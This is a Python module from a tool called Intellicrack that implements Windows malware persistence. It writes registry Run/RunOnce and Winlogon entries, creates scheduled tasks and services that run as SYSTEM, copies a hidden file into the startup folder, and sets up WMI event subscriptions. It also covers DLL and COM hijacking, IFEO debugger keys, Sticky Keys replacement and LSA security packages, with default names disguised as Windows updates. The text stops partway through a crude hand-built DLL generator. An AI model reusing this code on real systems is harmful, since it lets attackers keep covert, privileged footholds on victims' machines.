"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import logging
import os
import subprocess
from typing import Any

from .base_persistence import BasePersistence

"""
Windows Persistence Mechanisms

Implements various persistence techniques for Windows systems including
registry modifications, scheduled tasks, services, and WMI.
"""


class WindowsPersistence(BasePersistence):
    """Windows-specific persistence implementation with multiple techniques.
    """

    def __init__(self):
        """Initialize the Windows persistence system.

        Sets up the Windows persistence framework with multiple techniques including
        registry Run/RunOnce keys, scheduled tasks, services, startup folder,
        WMI events, DLL hijacking, image file execution options, accessibility
        features, Winlogon helpers, COM hijacking, and LSA security packages.
        """
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.WindowsPersistence")
        self.persistence_methods = {
            "registry_run": self._registry_run_persistence,
            "registry_runonce": self._registry_runonce_persistence,
            "scheduled_task": self._scheduled_task_persistence,
            "service": self._service_persistence,
            "startup_folder": self._startup_folder_persistence,
            "wmi_event": self._wmi_event_persistence,
            "dll_hijacking": self._dll_hijacking_persistence,
            "image_file_execution": self._image_file_execution_persistence,
            "accessibility_feature": self._accessibility_feature_persistence,
            "winlogon_helper": self._winlogon_helper_persistence,
            "com_hijacking": self._com_hijacking_persistence,
            "lsa_security_package": self._lsa_security_package_persistence,
        }

        # Common persistence locations
        self.registry_locations = {
            "HKCU_Run": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            "HKLM_Run": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
            "HKCU_RunOnce": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "HKLM_RunOnce": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            "Winlogon": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
            "Image_File_Execution": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        }

    def get_default_method(self) -> str:
        """Get the default persistence method for Windows."""
        return "registry_run"

    def list_available_methods(self) -> list:
        """List all available persistence methods for Windows."""
        return list(self.persistence_methods.keys())

    def _registry_run_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via registry Run key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get("use_hklm", False)
            reg_key = self.registry_locations["HKLM_Run"] if use_hklm else self.registry_locations["HKCU_Run"]

            # Registry value name
            value_name = options.get("value_name", "Windows Security Update")

            # Command to execute
            command = f'"{payload_path}"'
            if options.get("add_args"):
                command += f' {options["add_args"]}'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            # Use shared subprocess result handler
            success, details, cleanup_info = self.handle_subprocess_result(result, details, cleanup_info)

            if success:
                # Add success details
                additional_details = {
                    "registry_key": reg_key,
                    "value_name": value_name,
                    "command": command,
                }

                cleanup_info.update({
                    "type": "registry",
                    "key": reg_key,
                    "value": value_name,
                })

                return self.create_success_result(details, cleanup_info, additional_details)
            return success, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _registry_runonce_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via registry RunOnce key."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Choose registry hive
            use_hklm = options.get("use_hklm", False)
            reg_key = self.registry_locations["HKLM_RunOnce"] if use_hklm else self.registry_locations["HKCU_RunOnce"]

            # Registry value name
            value_name = options.get("value_name", "System Configuration")

            # Command - RunOnce entries are deleted after execution
            command = f'"{payload_path}"'

            # Add registry entry
            cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_SZ /d "{command}" /f'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details["registry_key"] = reg_key
                details["value_name"] = value_name
                details["command"] = command
                details["note"] = "RunOnce entries are automatically deleted after execution"

                cleanup_info["type"] = "registry"
                cleanup_info["key"] = reg_key
                cleanup_info["value"] = value_name

            return self.handle_persistence_method_completion(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _scheduled_task_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via scheduled task."""
        details, cleanup_info = self.init_persistence_data()

        try:
            task_name = options.get("task_name", "Windows System Maintenance")
            trigger = options.get("trigger", "ONLOGON")
            user = options.get("user", "SYSTEM")

            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc {trigger} /ru {user} /f'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details["task_name"] = task_name
                details["trigger"] = trigger
                details["user"] = user
                details["executable"] = payload_path

                cleanup_info["type"] = "scheduled_task"
                cleanup_info["task_name"] = task_name

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _service_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via Windows service."""
        details, cleanup_info = self.init_persistence_data()

        try:
            service_name = options.get("service_name", "WinUpdateSvc")
            display_name = options.get("display_name", "Windows Update Service Helper")
            start_type = options.get("start_type", "auto")

            # Create service
            cmd = f'sc create "{service_name}" binPath= "{payload_path}" DisplayName= "{display_name}" start= {start_type}'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                # Start the service
                start_cmd = f'sc start "{service_name}"'
                start_result = subprocess.run(start_cmd, check=False, shell=True, capture_output=True, text=True)

                details["service_name"] = service_name
                details["display_name"] = display_name
                details["start_type"] = start_type
                details["executable"] = payload_path
                details["started"] = start_result.returncode == 0

                cleanup_info["type"] = "service"
                cleanup_info["service_name"] = service_name

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _startup_folder_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via startup folder."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Determine startup folder
            use_all_users = options.get("use_all_users", False)

            if use_all_users:
                startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            else:
                startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")

            # Copy payload to startup folder
            filename = options.get("filename", "WindowsUpdate.exe")
            destination = os.path.join(startup_folder, filename)

            # Copy file
            import shutil
            shutil.copy2(payload_path, destination)

            # Set file attributes to hidden
            if options.get("hide_file", True):
                subprocess.run(f'attrib +h "{destination}"', check=False, shell=True)

            details["startup_folder"] = startup_folder
            details["filename"] = filename
            details["destination"] = destination
            details["hidden"] = options.get("hide_file", True)

            cleanup_info["type"] = "file"
            cleanup_info["path"] = destination

            return self.create_success_result(details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _wmi_event_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via WMI event subscription."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # WMI event names
            filter_name = options.get("filter_name", "SystemBootFilter")
            consumer_name = options.get("consumer_name", "SystemBootConsumer")
            binding_name = options.get("binding_name", "SystemBootBinding")

            # Create WMI event filter
            filter_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"'''

            filter_result = subprocess.run(filter_cmd, check=False, shell=True, capture_output=True, text=True)

            if filter_result.returncode == 0:
                # Create WMI event consumer
                consumer_cmd = f'''wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", ExecutablePath="{payload_path}", CommandLineTemplate="{payload_path}"'''

                consumer_result = subprocess.run(consumer_cmd, check=False, shell=True, capture_output=True, text=True)

                if consumer_result.returncode == 0:
                    # Create WMI event binding
                    binding_cmd = f'''wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\\"{filter_name}\\"", Consumer="CommandLineEventConsumer.Name=\\"{consumer_name}\\""'''

                    binding_result = subprocess.run(binding_cmd, check=False, shell=True, capture_output=True, text=True)

                    if binding_result.returncode == 0:
                        self.logger.info(f"WMI persistence established with binding: {binding_name}")
                        details["filter_name"] = filter_name
                        details["consumer_name"] = consumer_name
                        details["binding_name"] = binding_name
                        details["executable"] = payload_path
                        details["wmi_binding_created"] = binding_name

                        cleanup_info["type"] = "wmi_event"
                        cleanup_info["filter_name"] = filter_name
                        cleanup_info["consumer_name"] = consumer_name
                        cleanup_info["binding_name"] = binding_name

                        return True, details, cleanup_info

            details["error"] = "Failed to create WMI event subscription"
            return False, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _dll_hijacking_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via DLL hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target DLL to hijack
            target_dll = options.get("target_dll", "version.dll")
            target_application = options.get("target_app", "explorer.exe")

            # Find application directory
            app_dir = options.get("app_dir", r"C:\Windows")
            dll_path = os.path.join(app_dir, target_dll)

            # Validate target application exists
            app_path = None
            for search_path in [r"C:\Windows", r"C:\Windows\System32", app_dir]:
                if search_path and os.path.exists(os.path.join(search_path, target_application)):
                    app_path = os.path.join(search_path, target_application)
                    break

            if not app_path:
                self.logger.warning(f"Target application {target_application} not found for DLL hijacking")

            # Convert payload to DLL format
            dll_payload = self._create_hijack_dll(payload_path, target_dll)

            if dll_payload:
                # Write DLL to target location
                with open(dll_path, "wb") as f:
                    f.write(dll_payload)

                details["target_dll"] = target_dll
                details["target_application"] = target_application
                details["target_app_path"] = app_path if app_path else "Not found"
                details["dll_path"] = dll_path
                details["app_directory"] = app_dir
                self.logger.info(f"DLL hijacking setup for {target_application} using {target_dll}")

                cleanup_info["type"] = "file"
                cleanup_info["path"] = dll_path

                return True, details, cleanup_info
            details["error"] = "Failed to create hijack DLL"
            return False, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _image_file_execution_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via Image File Execution Options."""
        details, cleanup_info = self.init_persistence_data()

        try:
            target_executable = options.get("target_exe", "notepad.exe")

            # Registry key for IFEO
            reg_key = f"{self.registry_locations['Image_File_Execution']}\\{target_executable}"

            # Add debugger entry
            cmd = f'reg add "{reg_key}" /v Debugger /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details["target_executable"] = target_executable
                details["registry_key"] = reg_key
                details["debugger_path"] = payload_path

                cleanup_info["type"] = "registry"
                cleanup_info["key"] = reg_key
                cleanup_info["value"] = "Debugger"

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _accessibility_feature_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via accessibility feature replacement."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target accessibility feature
            target_feature = options.get("target_feature", "sethc.exe")  # Sticky Keys

            # System32 directory
            system32_dir = os.path.join(os.environ["WINDIR"], "System32")
            target_path = os.path.join(system32_dir, target_feature)
            backup_path = target_path + ".bak"

            # Backup original file
            if os.path.exists(target_path):
                import shutil
                shutil.copy2(target_path, backup_path)

                # Replace with payload
                shutil.copy2(payload_path, target_path)

                details["target_feature"] = target_feature
                details["target_path"] = target_path
                details["backup_path"] = backup_path

                cleanup_info["type"] = "file_replacement"
                cleanup_info["target_path"] = target_path
                cleanup_info["backup_path"] = backup_path

                return True, details, cleanup_info
            details["error"] = f"Target file {target_path} not found"
            return False, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _winlogon_helper_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via Winlogon helper."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for Winlogon
            reg_key = self.registry_locations["Winlogon"]
            value_name = options.get("value_name", "Shell")

            # Get current shell value
            get_cmd = f'reg query "{reg_key}" /v {value_name}'
            get_result = subprocess.run(get_cmd, check=False, shell=True, capture_output=True, text=True)

            current_shell = "explorer.exe"  # Default
            if get_result.returncode == 0:
                # Parse current value
                lines = get_result.stdout.split("\n")
                for line in lines:
                    if value_name in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            current_shell = parts[-1]

            # Set new shell value
            new_shell = f"{current_shell},{payload_path}"
            set_cmd = f'reg add "{reg_key}" /v {value_name} /t REG_SZ /d "{new_shell}" /f'

            result = subprocess.run(set_cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details["registry_key"] = reg_key
                details["value_name"] = value_name
                details["original_shell"] = current_shell
                details["new_shell"] = new_shell

                cleanup_info["type"] = "registry"
                cleanup_info["key"] = reg_key
                cleanup_info["value"] = value_name
                cleanup_info["original_value"] = current_shell

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _com_hijacking_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via COM object hijacking."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Target COM CLSID
            clsid = options.get("clsid", "{BCDE0395-E52F-467C-8E3D-C4579291692E}")  # MMDeviceEnumerator

            # Registry keys for COM hijacking
            user_key = f"HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{clsid}\\InProcServer32"

            # Create registry entry
            cmd = f'reg add "{user_key}" /ve /t REG_SZ /d "{payload_path}" /f'

            result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                details["clsid"] = clsid
                details["registry_key"] = user_key
                details["dll_path"] = payload_path

                cleanup_info["type"] = "registry"
                cleanup_info["key"] = user_key

                return True, details, cleanup_info

            return self.handle_subprocess_result(result, details, cleanup_info)

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def _lsa_security_package_persistence(self, payload_path: str, options: dict[str, Any]) -> tuple[bool, dict, dict]:
        """Establish persistence via LSA Security Package."""
        details, cleanup_info = self.init_persistence_data()

        try:
            # Registry key for LSA Security Packages
            reg_key = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
            value_name = "Security Packages"

            # Get current security packages
            get_cmd = f'reg query "{reg_key}" /v "{value_name}"'
            get_result = subprocess.run(get_cmd, check=False, shell=True, capture_output=True, text=True)

            current_packages = []
            if get_result.returncode == 0:
                # Parse current values
                lines = get_result.stdout.split("\n")
                for line in lines:
                    if value_name in line:
                        # Extract package names
                        parts = line.split("REG_MULTI_SZ")
                        if len(parts) > 1:
                            packages_str = parts[1].strip()
                            current_packages = packages_str.split()

            # Add our package
            package_name = options.get("package_name", "mssecpkg")
            if package_name not in current_packages:
                current_packages.append(package_name)

            # Create DLL for the security package
            dll_path = os.path.join(os.path.dirname(payload_path), f"{package_name}.dll")
            dll_content = self._create_security_package_dll(payload_path)

            if dll_content:
                with open(dll_path, "wb") as f:
                    f.write(dll_content)

                # Update registry with proper REG_MULTI_SZ handling
                # Method 1: Using reg.exe with hex values
                hex_values = []
                for pkg in current_packages:
                    # Convert each package name to hex
                    for char in pkg:
                        hex_values.append(f"{ord(char):02x},00")
                    # Add null terminator between strings
                    hex_values.append("00,00")

                # Add final double null terminator
                hex_values.append("00,00")

                # Create hex string
                hex_string = ",".join(hex_values).rstrip(",")

                # Use reg add with hex type
                cmd = f'reg add "{reg_key}" /v "{value_name}" /t REG_MULTI_SZ /d hex(7):{hex_string} /f'

                # Try the hex method first
                result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)

                if result.returncode != 0:
                    # Fallback: Use PowerShell for more reliable REG_MULTI_SZ handling
                    ps_script = f"""
$packages = @({','.join(f'"{pkg}"' for pkg in current_packages)})
Set-ItemProperty -Path 'Registry::{reg_key}' -Name '{value_name}' -Value $packages -Type MultiString
"""
                    ps_cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
                    ps_result = subprocess.run(ps_cmd, check=False, capture_output=True, text=True)

                    if ps_result.returncode != 0:
                        # Final fallback: Use Windows API via ctypes
                        try:
                            import ctypes
                            try:
                                from ctypes import wintypes
                                HAS_WINTYPES = True
                                self.logger.debug("Using native wintypes for registry operations")
                            except ImportError:
                                # Create basic wintypes replacement
                                class MockWintypes:
                                    """Mock wintypes implementation for cross-platform compatibility."""

                                    class HKEY:
                                        """Mock HKEY class for registry operations."""

                                        def __init__(self):
                                            """Initialize HKEY mock type with default value."""
                                            self.value = 0
                                wintypes = MockWintypes()
                                HAS_WINTYPES = False
                                self.logger.debug("Using mock wintypes for cross-platform compatibility")

                            # Open registry key using appropriate implementation
                            if HAS_WINTYPES:
                                key_handle = wintypes.HKEY()
                            else:
                                key_handle = wintypes.HKEY()
                            if reg_key.startswith("HKEY_LOCAL_MACHINE"):
                                root_key = 0x80000002  # HKEY_LOCAL_MACHINE
                                sub_key = reg_key.replace("HKEY_LOCAL_MACHINE\\", "")
                            else:
                                raise ValueError("Unsupported root key")

                            advapi32 = ctypes.windll.advapi32

                            # Open key with write access
                            result = advapi32.RegOpenKeyExW(
                                root_key, sub_key, 0,
                                0x20006,  # KEY_WRITE | KEY_READ
                                ctypes.byref(key_handle),
                            )

                            if result == 0:
                                # Prepare multi-string data
                                data = "\0".join(current_packages) + "\0\0"
                                data_bytes = data.encode("utf-16-le")

                                # Set value
                                result = advapi32.RegSetValueExW(
                                    key_handle,
                                    value_name,
                                    0,
                                    7,  # REG_MULTI_SZ
                                    data_bytes,
                                    len(data_bytes),
                                )

                                # Close key
                                advapi32.RegCloseKey(key_handle)

                                if result != 0:
                                    details["error"] = f"Failed to set registry value: {result}"
                                    return False, details, cleanup_info
                        except Exception as e:
                            self.logger.error("Exception in windows_persistence: %s", e)
                            details["error"] = f"Registry update failed: {e}"
                            return False, details, cleanup_info

                details["package_name"] = package_name
                details["dll_path"] = dll_path
                details["registry_key"] = reg_key
                details["packages"] = current_packages

                cleanup_info["type"] = "lsa_package"
                cleanup_info["package_name"] = package_name
                cleanup_info["dll_path"] = dll_path
                cleanup_info["registry_key"] = reg_key
                cleanup_info["value_name"] = value_name

                return True, details, cleanup_info
            details["error"] = "Failed to create security package DLL"
            return False, details, cleanup_info

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_persistence_error(e, details, cleanup_info)

    def remove_persistence(self, cleanup_info: dict[str, Any]) -> bool:
        """Remove established persistence."""
        try:
            cleanup_type = cleanup_info.get("type")

            if cleanup_type == "registry":
                key = cleanup_info["key"]
                value = cleanup_info.get("value")

                if value:
                    cmd = f'reg delete "{key}" /v "{value}" /f'
                else:
                    cmd = f'reg delete "{key}" /f'

                result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            if cleanup_type == "scheduled_task":
                task_name = cleanup_info["task_name"]
                cmd = f'schtasks /delete /tn "{task_name}" /f'
                result = subprocess.run(cmd, check=False, shell=True, capture_output=True, text=True)
                return result.returncode == 0

            if cleanup_type == "service":
                service_name = cleanup_info["service_name"]

                # Use common service cleanup pattern
                service_commands = {
                    "stop": f'sc stop "{service_name}"',
                    "disable": f'sc delete "{service_name}"',  # On Windows, delete is the equivalent of disable/remove
                }

                return self.cleanup_service_common_pattern(service_name, service_commands)

            if cleanup_type == "file":
                file_path = cleanup_info["path"]
                if os.path.exists(file_path):
                    os.remove(file_path)
                    return True

            elif cleanup_type == "file_replacement":
                target_path = cleanup_info["target_path"]
                backup_path = cleanup_info["backup_path"]

                if os.path.exists(backup_path):
                    import shutil
                    shutil.move(backup_path, target_path)
                    return True

            elif cleanup_type == "wmi_event":
                filter_name = cleanup_info["filter_name"]
                consumer_name = cleanup_info["consumer_name"]
                binding_name = cleanup_info["binding_name"]

                # Remove WMI event binding
                binding_cmd = f'wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding where "Filter=\\"__EventFilter.Name=\\\\\\"{filter_name}\\\\\\"\\""  delete'
                subprocess.run(binding_cmd, check=False, shell=True, capture_output=True, text=True)

                # Remove WMI event consumer
                consumer_cmd = f'wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer where "Name=\\"{consumer_name}\\""  delete'
                subprocess.run(consumer_cmd, check=False, shell=True, capture_output=True, text=True)

                # Remove WMI event filter
                filter_cmd = f'wmic /namespace:\\\\root\\subscription PATH __EventFilter where "Name=\\"{filter_name}\\""  delete'
                result = subprocess.run(filter_cmd, check=False, shell=True, capture_output=True, text=True)

                self.logger.info(f"Cleaned up WMI event subscription: {binding_name}")
                return result.returncode == 0

            elif cleanup_type == "lsa_package":
                package_name = cleanup_info["package_name"]
                dll_path = cleanup_info["dll_path"]
                registry_key = cleanup_info.get("registry_key", r"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa")
                value_name = cleanup_info.get("value_name", "Security Packages")

                # Remove the DLL file
                if os.path.exists(dll_path):
                    try:
                        os.remove(dll_path)
                    except Exception as e:
                        self.logger.warning(f"Failed to remove DLL: {e}")

                # Remove package from registry REG_MULTI_SZ list
                try:
                    # Get current packages
                    get_cmd = f'reg query "{registry_key}" /v "{value_name}"'
                    get_result = subprocess.run(get_cmd, check=False, shell=True, capture_output=True, text=True)

                    current_packages = []
                    if get_result.returncode == 0:
                        # Parse current values
                        lines = get_result.stdout.split("\n")
                        for line in lines:
                            if value_name in line:
                                # Extract package names
                                parts = line.split("REG_MULTI_SZ")
                                if len(parts) > 1:
                                    packages_str = parts[1].strip()
                                    current_packages = packages_str.split()

                    # Remove our package
                    if package_name in current_packages:
                        current_packages.remove(package_name)

                        # Update registry with remaining packages
                        if current_packages:
                            # Use PowerShell for reliable REG_MULTI_SZ update
                            ps_script = f"""
$packages = @({','.join(f'"{pkg}"' for pkg in current_packages)})
Set-ItemProperty -Path 'Registry::{registry_key}' -Name '{value_name}' -Value $packages -Type MultiString
"""
                            ps_cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
                            ps_result = subprocess.run(ps_cmd, check=False, capture_output=True, text=True)

                            if ps_result.returncode != 0:
                                # Fallback to ctypes method
                                import ctypes
                                try:
                                    from ctypes import wintypes
                                    HAS_WINTYPES = True
                                    self.logger.debug("Using native wintypes for registry fallback")
                                except ImportError:
                                    # Create basic wintypes replacement
                                    class MockWintypes:
                                        """Mock wintypes replacement for non-Windows platforms."""

                                        class HKEY:
                                            """Mock HKEY implementation."""

                                            def __init__(self):
                                                """Initialize HKEY mock type with default value."""
                                                self.value = 0
                                    wintypes = MockWintypes()
                                    HAS_WINTYPES = False
                                    self.logger.debug("Using mock wintypes for fallback registry operations")

                                # Open registry key with appropriate implementation
                                if HAS_WINTYPES:
                                    key_handle = wintypes.HKEY()
                                else:
                                    key_handle = wintypes.HKEY()
                                root_key = 0x80000002  # HKEY_LOCAL_MACHINE
                                sub_key = registry_key.replace("HKEY_LOCAL_MACHINE\\", "")

                                advapi32 = ctypes.windll.advapi32

                                # Open key with write access
                                result = advapi32.RegOpenKeyExW(
                                    root_key, sub_key, 0,
                                    0x20006,  # KEY_WRITE | KEY_READ
                                    ctypes.byref(key_handle),
                                )

                                if result == 0:
                                    # Prepare multi-string data
                                    data = "\0".join(current_packages) + "\0\0"
                                    data_bytes = data.encode("utf-16-le")

                                    # Set value
                                    advapi32.RegSetValueExW(
                                        key_handle,
                                        value_name,
                                        0,
                                        7,  # REG_MULTI_SZ
                                        data_bytes,
                                        len(data_bytes),
                                    )

                                    # Close key
                                    advapi32.RegCloseKey(key_handle)
                        else:
                            # If no packages left, delete the value
                            del_cmd = f'reg delete "{registry_key}" /v "{value_name}" /f'
                            subprocess.run(del_cmd, check=False, shell=True, capture_output=True, text=True)

                    self.logger.info(f"Cleaned up LSA security package: {package_name}")
                    return True

                except Exception as e:
                    self.logger.error(f"Failed to remove LSA package from registry: {e}")
                    # Still return True if we at least removed the DLL
                    return not os.path.exists(dll_path)

            return False

        except Exception as e:
            self.logger.error("Exception in windows_persistence: %s", e)
            return self.handle_remove_persistence_error(e)

    def _create_hijack_dll(self, payload_path: str, dll_name: str) -> bytes | None:
        """Create a DLL for hijacking purposes."""
        # Log the DLL creation for the specific target
        self.logger.info(f"Creating hijack DLL: {dll_name} for payload: {payload_path}")

        import struct
        import time

        # Basic PE/DLL header structure
        dos_header = bytearray([
            0x4D, 0x5A,  # MZ signature
            0x90, 0x00,  # Bytes on last page
            0x03, 0x00,  # Pages in file
            0x00, 0x00,  # Relocations
            0x04, 0x00,  # Size of header in paragraphs
            0x00, 0x00,  # Minimum extra paragraphs
            0xFF, 0xFF,  # Maximum extra paragraphs
            0x00, 0x00,  # Initial SS
            0xB8, 0x00,  # Initial SP
            0x00, 0x00,  # Checksum
            0x00, 0x00,  # Initial IP
            0x00, 0x00,  # Initial CS
            0x40, 0x00,  # Relocation table offset
            0x00, 0x00,  # Overlay number
        ])

        # Extend DOS header to 0x40 bytes
        dos_header.extend([0] * (0x40 - len(dos_header)))

        # Add PE offset at 0x3C
        dos_header[0x3C:0x40] = struct.pack("<I", 0x80)  # PE header at offset 0x80

        # DOS stub program
        dos_stub = bytearray([
            0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
            0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
            0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72,
            0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
            0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E,
            0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20,
            0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
            0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ])

        # PE header
        pe_signature = b"PE\x00\x00"

        # COFF header (IMAGE_FILE_HEADER)
        machine = 0x8664 if "64" in dll_name else 0x014C  # AMD64 or I386
        num_sections = 3  # .text, .rdata, .data
        timestamp = int(time.time())
        characteristics = 0x2022  # DLL, executable image

        coff_header = struct.pack("<HHIIIHH",
            machine,          # Machine type
            num_sections,     # Number of sections
            timestamp,        # Time date stamp
            0,               # Pointer to symbol table
            0,               # Number of symbols
            240,             # Size of optional header (32-bit)
            characteristics,  # Characteristics
        )

        # Optional header (simplified)
        optional_header = bytearray()
        optional_header.extend(struct.pack("<H", 0x10B))  # Magic (PE32)
        optional_header.extend(struct.pack("<BB", 14, 0))  # Linker version
        optional_header.extend(struct.pack("<III", 0x1000, 0x1000, 0x1000))  # Code, data sizes
        optional_header.extend(struct.pack("<III", 0x1000, 0x1000, 0))  # Entry, bases
        optional_header.extend(struct.pack("<I", 0x400000))  # Image base
        optional_header.extend(struct.pack("<II", 0x1000, 0x200))  # Section, file alignment
        optional_header.extend(struct.pack("<HHHHH", 6, 0, 6, 0, 0))  # OS/Image/Subsystem versions
        optional_header.extend(struct.pack("<I", 0))  # Win32 version
        optional_header.extend(struct.pack("<III", 0x4000, 0x1000, 0x100000))  # Image size, headers, checksum
        optional_header.extend(struct.pack("<HH", 3, 0))  # Subsystem (console), DLL characteristics
        optional_header.extend(struct.pack("<IIII", 0x100000, 0x1000, 0x100000, 0x1000))  # Stack sizes
        optional_header.extend(struct.pack("<II", 0x10000, 0x1000))  # Heap sizes
        optional_header.extend(struct.pack("<I", 0))  # Loader flags
        optional_header.extend(struct.pack("<I", 16))  # Number of data directories

        # Data directories (16 entries, 8 bytes each)
        for _ in range(16):
            optional_header.extend(struct.pack("<II", 0, 0))

        # Section headers
        sections = bytearray()

        # .text section
        text_name = b".text\x00\x00\x00"
        sections.extend(text_name)
        sections.extend(struct.pack("<II", 0x1000, 0x1000))  # Virtual size, RVA
        sections.extend(struct.pack("<II", 0x200, 0x400))    # Size, pointer to raw data
        sections.extend(struct.pack("<IIHHI", 0, 0, 0, 0, 0x60000020))  # Characteristics (code, execute, read)

        # .rdata section
